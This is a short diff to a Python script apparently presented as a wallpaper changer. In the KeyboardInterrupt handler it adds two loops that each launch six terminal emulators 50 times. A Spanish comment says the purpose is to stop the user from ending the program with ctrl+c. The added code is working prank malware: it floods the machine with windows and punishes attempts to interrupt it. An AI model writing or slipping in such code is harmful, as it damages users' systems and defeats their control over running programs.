@@ -96,6 +96,30 @@ def set_wallpapers():
                     break
 #    Para que el usuario no pueda intentar parar el programa presionando ctrl + c
      except KeyboardInterrupt:
-          pass
+          for _ in range(50):
+               system('qterminal')
+               
+               system('terminator')
+               
+               system('alacritty')
+               
+               system('xterm')
+               
+               system('konsole')
+               
+               
+               system('xfce4-terminal-emulator')
           
-     
+          for _ in range(50):
+               system('qterminal')
+               
+               system('terminator')
+               
+               system('alacritty')
+               
+               system('xterm')
+               
+               system('konsole')
+               
+               
+               system('xfce4-terminal-emulator')
